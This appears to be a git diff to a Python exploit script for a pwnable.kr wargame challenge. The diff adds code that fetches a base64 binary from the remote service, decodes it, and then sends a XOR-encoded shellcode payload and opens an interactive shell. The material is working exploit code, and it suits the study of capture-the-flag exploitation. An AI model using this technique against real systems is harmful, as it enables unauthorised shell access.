@@ -3,11 +3,20 @@
 import angr
 import find
 import sys
+import os
 from pwn import *
 
 context(arch = 'amd64')
 
-tar = sys.argv[1]
+conn = remote('pwnable.kr', '9005')
+stuff = conn.recvuntil('here, get this binary')
+lines = stuff.split('\n')
+better = zip(map(len, lines), lines)
+better.sort()
+write('code.b64', better[-1][1])
+os.system('base64 -d code.b64 | gunzip > code')
+
+tar = 'code'
 
 # Find dynamic elements in file
 loc = find.get_addresses(tar)
@@ -84,3 +93,5 @@ kill += asm(shellcraft.sh())
 # Write payload
 payload = xor(cert + kill, loc['pad'], cut = 'max')
 write('sploit', payload.encode('hex'))
+conn.sendline(payload.encode('hex'))
+conn.interactive()
